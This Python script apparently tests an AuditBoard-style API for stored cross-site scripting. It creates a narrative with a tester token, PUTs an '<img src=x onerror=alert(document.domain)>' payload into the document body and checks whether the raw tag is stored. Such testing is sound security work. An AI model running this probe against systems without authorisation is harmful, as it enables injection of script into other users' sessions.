import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== Tester: create a narrative, then write HTML into its body ===")
tag='ZXT'+uuid.uuid4().hex[:5]
c,b=req('POST','/api/v1/narratives',{"narrative":{"name":f"ZX{tag}","uid":f"zxt{tag}"}})
print(f"  create narrative -> {c}")
nid=None
if c in ('200','201'):
    try:
        o=json.loads(b)['narratives'][0]
        nid=o['id']; print(f"    id={nid} docver={o.get('alias_latest_document_version_id')}")
    except: print("   ",b[:150])
if nid:
    c,b=req('GET',f'/api/v1/narratives/{nid}')
    o=json.loads(b)['narratives'][0]
    dv=o.get('alias_latest_document_version_id')
    print(f"  docver={dv}")
    pay=f'<img src=x onerror=alert(document.domain)>{tag}'
    if dv:
        for body in [{"document_version":{"body":pay}},
                     {"document_version":{"body":f"<p>{pay}</p>"}}]:
            c,b=req('PUT',f'/api/v1/document_versions/{dv}',body)
            print(f"    PUT body -> {c} {b[:120].replace(chr(10),' ')}")
            if c=='200':
                c2,b2=req('GET',f'/api/v1/document_versions/{dv}')
                try:
                    st=json.loads(b2)['document_versions'][0]
                    print(f"      stored body={str(st.get('body'))[:140]!r}")
                    print(f"      RAW={'<img' in str(st.get('body'))}")
                except: pass
    open('/tmp/tester_narr','w').write(str(nid))
